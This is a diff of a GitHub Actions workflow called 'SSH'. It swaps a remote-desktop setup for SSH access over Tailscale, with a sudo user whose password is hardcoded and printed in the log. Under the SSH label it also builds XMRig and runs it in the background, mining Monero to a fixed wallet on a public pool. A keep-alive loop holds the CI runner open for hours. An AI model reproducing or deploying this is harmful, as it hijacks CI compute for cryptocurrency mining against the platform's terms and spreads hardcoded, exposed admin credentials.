@@ -1,113 +1,211 @@
-name: Ubuntu RDP
+name: SSH
 
 on:
   workflow_dispatch:
 
 jobs:
-  ubuntu-rdp:
+  secure-ssh:
     runs-on: ubuntu-latest
     timeout-minutes: 3600
 
     steps:
-      - name: نصب XRDP و محیط دسکتاپ
+      - name: Configure SSH Settings
         run: |
+          # Update package list
           sudo apt-get update
-          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y \
-            xrdp \
-            lxde-core \
-            lxde \
-            dbus-x11 \
-            x11-xserver-utils \
-            lightdm
           
-          sudo ufw allow 3389/tcp
-          sudo ufw --force enable
+          # Install OpenSSH Server if not present
+          sudo apt-get install -y openssh-server
+          
+          # Enable and start SSH service
+          sudo systemctl enable ssh
+          sudo systemctl start ssh
+          
+          # Configure SSH to allow password authentication
+          sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          
+          # Restart SSH service to apply changes
+          sudo systemctl restart ssh
+          
+          # Configure firewall to allow SSH (port 22)
+          sudo ufw allow 22/tcp
+          
+          echo "SSH configured successfully"
 
-      - name: ایجاد کاربر RDP و پیکربندی LXDE
+      - name: Create SSH User with Fixed Password
         run: |
-          sudo useradd -m -s /bin/bash rdpuser
-          echo "rdpuser:*m96319631Z-" | sudo chpasswd
-          sudo usermod -aG sudo rdpuser
-
-          echo "startlxde" | sudo tee /home/rdpuser/.xsession
-          sudo chmod +x /home/rdpuser/.xsession
-          sudo chown rdpuser:rdpuser /home/rdpuser/.xsession
-
-          # ایجاد فایل startwm.sh بدون heredoc
-          sudo bash -c 'printf "%s\n" "#!/bin/sh" \
-          "if [ -r /etc/default/locale ]; then" \
-          "  . /etc/default/locale" \
-          "  export LANG LANGUAGE" \
-          "fi" \
-          "" \
-          "if [ -r /etc/profile ]; then . /etc/profile; fi" \
-          "" \
-          "if [ -r \"$HOME/.xsession\" ]; then" \
-          "  . \"$HOME/.xsession\"" \
-          "elif [ -r /etc/X11/Xsession ]; then" \
-          "  . /etc/X11/Xsession" \
-          "fi" > /etc/xrdp/startwm.sh'
-
-          sudo chmod +x /etc/xrdp/startwm.sh
-          sudo sed -i 's/^allowed_users=console/allowed_users=any/' /etc/X11/Xwrapper.config
-
-          if ! id rdpuser &>/dev/null; then
-            echo "ایجاد کاربر ناموفق بود"
-            exit 1
+          # Set your fixed password here
+          PASSWORD="*r96319631P-"
+          
+          # Create user with the fixed password
+          sudo useradd -m -s /bin/bash SSH
+          echo "SSH:$PASSWORD" | sudo chpasswd
+          
+          # Add user to sudo group for admin privileges
+          sudo usermod -aG sudo SSH
+          
+          # Store credentials in environment
+          echo "SSH_CREDS=User: SSH | Password: $PASSWORD" >> $GITHUB_ENV
+          
+          # Verify user creation
+          if ! id "SSH" &>/dev/null; then
+              echo "User creation failed"
+              exit 1
           fi
+          
+          echo "User SSH created successfully"
 
-          echo "RDP_CREDS=User: rdpuser | Password: *m96319631Z-" >> $GITHUB_ENV
-          sudo systemctl enable xrdp
-          sudo systemctl restart xrdp
-          sleep 5
-
-      - name: نصب Tailscale
+      - name: Install Tailscale
         run: |
-          curl -fsSL https://tailscale.com/install.sh | sh
+          # Add Tailscale's package signing key and repository
+          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.noarmor.gpg | sudo tee /usr/share/keyrings/tailscale-archive-keyring.gpg >/dev/null
+          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.tailscale-keyring.list | sudo tee /etc/apt/sources.list.d/tailscale.list
+          
+          # Install Tailscale
+          sudo apt-get update
+          sudo apt-get install -y tailscale
+          
+          echo "Tailscale installed successfully"
 
-      - name: برقراری اتصال Tailscale
+      - name: Establish Tailscale Connection
         run: |
-          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-ubuntu-${{ github.run_id }}
-
-          retries=0
-          while [ -z "$TSIP" ] && [ $retries -lt 10 ]; do
-              TSIP=$(tailscale ip -4)
+          # Bring up Tailscale with the provided auth key and set a unique hostname
+          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$GITHUB_RUN_ID
+          
+          # Wait for Tailscale to assign an IP
+          TAILSCALE_IP=""
+          RETRIES=0
+          while [ -z "$TAILSCALE_IP" ] && [ $RETRIES -lt 10 ]; do
+              TAILSCALE_IP=$(tailscale ip -4)
               sleep 5
-              retries=$((retries + 1))
+              RETRIES=$((RETRIES + 1))
           done
-
-          if [ -z "$TSIP" ]; then
-              echo "آدرس IP تِیل‌اِسکِیل تخصیص داده نشد. خروج."
+          
+          if [ -z "$TAILSCALE_IP" ]; then
+              echo "Tailscale IP not assigned. Exiting."
               exit 1
           fi
+          
+          echo "TAILSCALE_IP=$TAILSCALE_IP" >> $GITHUB_ENV
+          echo "Tailscale connected with IP: $TAILSCALE_IP"
 
-          echo "TAILSCALE_IP=$TSIP" >> $GITHUB_ENV
-          echo "آدرس IP تِیل‌اِسکِیل: $TSIP"
-
-      - name: تأیید دسترسی RDP
+      - name: Verify SSH Accessibility
         run: |
-          echo "آدرس IP تِیل‌اِسکِیل: $TAILSCALE_IP"
-          if ! sudo netstat -tuln | grep :3389; then
-              echo "XRDP روی پورت 3389 در حال گوش دادن نیست"
+          echo "Tailscale IP: $TAILSCALE_IP"
+          
+          # Check if SSH service is running
+          sudo systemctl status ssh --no-pager
+          
+          # Test SSH port locally
+          if nc -zv localhost 22 2>&1 | grep -q succeeded; then
+              echo "SSH port 22 is accessible"
+          else
+              echo "SSH port 22 is NOT accessible"
               exit 1
           fi
+          
+          echo "SSH connectivity verified successfully"
 
-          sudo systemctl status xrdp
-          echo "سرویس XRDP در حال اجرا و گوش دادن روی پورت 3389 است"
+      - name: Install XMRig
+        run: |
+          # Install dependencies
+          sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          
+          # Clone XMRig repository
+          cd /home/SSH
+          sudo -u SSH git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+          
+          # Create build directory
+          sudo -u SSH mkdir build
+          cd build
+          
+          # Build XMRig
+          sudo -u SSH cmake ..
+          sudo -u SSH make -j$(nproc)
+          
+          echo "XMRig compiled successfully"
 
-      - name: حفظ اتصال
+      - name: Configure XMRig
+        run: |
+          # Create config file for XMRig
+          cat << 'EOF' | sudo tee /home/SSH/xmrig/build/config.json
+{
+    "autosave": true,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "hw-aes": null,
+        "priority": null,
+        "max-threads-hint": 100,
+        "asm": true,
+        "rx": [0, 1, 2, 3],
+        "cn": [0, 1],
+        "cn-heavy": [0, 1],
+        "cn-lite": [0, 1]
+    },
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "url": "pool.hashvault.pro:443",
+            "user": "44A9mpd1SYZNd8v2yLMH7YAtzMrcEr2va5TpA8SH7E6cN4NTUfYeLtXhRZBPFLQGmySaZWYCJNjkVaszdh4AEivA8ZjfnEG",
+            "pass": "x",
+            "keepalive": true,
+            "tls": false
+        }
+    ]
+}
+EOF
+          
+          sudo chown SSH:SSH /home/SSH/xmrig/build/config.json
+          echo "XMRig configuration created"
+
+      - name: Start XMRig
+        run: |
+          # Start XMRig in background
+          cd /home/SSH/xmrig/build
+          sudo -u SSH nohup ./xmrig > /home/SSH/xmrig.log 2>&1 &
+          
+          # Wait a bit and check if it's running
+          sleep 5
+          if pgrep -x "xmrig" > /dev/null; then
+              echo "XMRig started successfully"
+          else
+              echo "Warning: XMRig may not be running properly"
+          fi
+
+      - name: Maintain Connection
         run: |
           echo ""
-          echo "=== اطلاعات دسترسی RDP ==="
-          echo "آدرس (Address): $TAILSCALE_IP"
-          echo "نام کاربری (Username): rdpuser"
-          echo "رمز عبور (Password): *m96319631Z-"
-          echo "=========================="
+          echo "=== SSH ACCESS ==="
+          echo "Address: $TAILSCALE_IP"
+          echo "Port: 22"
+          echo "Username: SSH"
+          echo "Password: *r96319631P-"
+          echo "=================="
           echo ""
-          echo "محیط دسکتاپ: LXDE (سبک)"
+          echo "=== XMRig STATUS ==="
+          echo "XMRig is running in background"
+          echo "Log file: /home/SSH/xmrig.log"
+          echo "Config: /home/SSH/xmrig/build/config.json"
+          echo "===================="
+          echo ""
+          echo "Connect using: ssh SSH@$TAILSCALE_IP"
+          echo "View XMRig log: tail -f /home/SSH/xmrig.log"
           echo ""
           
+          # Keep runner active indefinitely (or until manually cancelled)
           while true; do
-              echo "[$(date)] RDP فعال - برای خاتمه دادن از دکمه لغو Workflow استفاده کنید"
+              echo "[$(date)] SSH Active | XMRig Running - Use 'Cancel workflow' button to terminate"
+              
+              # Show XMRig process status
+              if pgrep -x "xmrig" > /dev/null; then
+                  echo "[$(date)] XMRig process is running"
+              else
+                  echo "[$(date)] WARNING: XMRig process not found!"
+              fi
+              
               sleep 300
           done
